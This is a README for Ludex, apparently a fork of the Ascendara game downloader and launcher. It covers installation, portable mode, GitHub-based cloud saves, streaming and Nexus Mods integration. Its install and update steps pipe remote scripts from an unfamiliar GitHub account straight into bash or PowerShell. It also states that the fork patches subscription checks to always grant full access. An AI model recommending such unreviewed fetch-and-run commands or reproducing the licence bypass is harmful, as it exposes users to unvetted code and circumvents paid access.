![Ludex](assets/ludex.png)

# Ludex

Ludex is a local-first game library, downloader, and launcher for Windows and Linux.
It is a rebranded and extended fork of Ascendara with the Ascend account requirement removed.

## Highlights

- **No account required** for the profile, banner, artwork, mods, or trainers.
- **Every Ascend feature is free** — subscription checks always return full access.
- **Cloud game saves** through your own private GitHub repository, with no server bill.
- **SteamGridDB artwork** — right-click a game in the library and choose **Customize** to pull a new cover, banner, logo, and wide banner automatically.
- **Nexus Mods browser** with optional direct install using a Nexus API key.
- **Download queue**, automatic extraction, integrity verification, and per-game speed limits.
- **Local profile backup** — export/import your profile picture, banner, and emoji.
- **Desktop and Start Menu shortcuts** created directly by the app.
- **Own update channel** through GitHub Releases.

## Install

### Linux

```bash
curl -fsSL https://raw.githubusercontent.com/spammail10q1-cloud/ludex/main/install-linux.sh | bash
```

Then run `ludex` or open **Ludex** from your application menu.

### Windows

```powershell
irm https://raw.githubusercontent.com/spammail10q1-cloud/ludex/main/install-windows.ps1 | iex
```

This downloads the portable build, installs it to `%LOCALAPPDATA%\Ludex`, and creates Start Menu and Desktop shortcuts.

### Steam Deck / SteamOS

```bash
curl -fsSL https://raw.githubusercontent.com/spammail10q1-cloud/ludex/main/install-steamdeck.sh | bash
```

The script installs Ludex in Desktop Mode, handles missing FUSE/libfuse2 with an extracted fallback, and creates a launchable entry for Steam Game Mode. Add **Ludex** as a Non-Steam Game to use it in Game Mode.

## Portable mode (USB / external SSD)

Run Ludex entirely from a USB stick or external drive:

- **Windows:** put `Ludex.exe` next to `portable/LudexPortable.bat` and run the `.bat`.
- **Linux / Steam Deck:** put `Ludex.AppImage` next to `portable/LudexPortable.sh` and run the script.

Everything lives on the drive:

- `LudexData/` — settings, profile, artwork cache, Proton prefixes, runners
- `Games/` — default game install folder

Nothing is written to the host PC's home folder. Release packages include ready-made USB zips.

## Ludex Cloud (zero-cost, bring your own storage)

Ludex Cloud has **no Ludex server and no database bill**. It stores a private snapshot in a GitHub repository that you own:

- **game saves** (via Ludusavi)
- profile picture, banner and emoji
- preferences
- library metadata, favorites and mod profiles

Create a fine-grained GitHub token with **Contents: Read and write**, connect it in **Cloud**, create a private `ludex-cloud` repository, then push or pull. GitHub's free plan is enough. The snapshot is stored in your repo; the save archive lives next to it as `saves.zip`.

## Ludex Stream

Ludex Stream turns your PC into a private game-streaming host using **Sunshine** and **Moonlight**:

- Install Sunshine on the host PC.
- Open **Stream** in Ludex, start Sunshine, and sync your games.
- Create an invite link for a game and a quality profile.
- Send the link to a friend on your network. The page includes the Moonlight command, client downloads, and Wake-on-LAN.
- Pair each client once in Sunshine's web UI, then stream.

No subscription and no central server: video and input stay between your devices. For internet play, forward the Sunshine ports and set a public host in Ludex Stream settings.

## Update

- Linux: `curl -fsSL https://raw.githubusercontent.com/spammail10q1-cloud/ludex/main/update-linux.sh | bash`
- Windows: `irm https://raw.githubusercontent.com/spammail10q1-cloud/ludex/main/update-windows.ps1 | iex`

User data stays in the legacy `ascendara` config folder, so updates never wipe your library, profile, or artwork.

## Build from source

```bash
npm install --global yarn@1.22.22
yarn install --frozen-lockfile
yarn build
```

For a Linux AppImage:

```bash
yarn dist-linux
```

For a Windows executable (run on Windows):

```powershell
python scripts/build_windows_helpers.py
yarn dist
```

GitHub Actions builds both targets automatically and publishes them as release assets when a `v*` tag is pushed.

## Nexus Mods without an API key

Ludex registers as the `nxm://` handler. On Nexus, click **Mod Manager Download** and Ludex resolves the free-account link, downloads the archive, and installs it. No API key and no Premium account are needed. You can also paste an `nxm://` link directly in the Mods tab.

## Nexus Mods direct install (API key)

Open a game → **Mods** → paste your Nexus Mods API key. Nexus Premium is required by Nexus itself for direct downloads. Without Premium the app still opens the normal Nexus download page.

## License

See `LICENSE`.
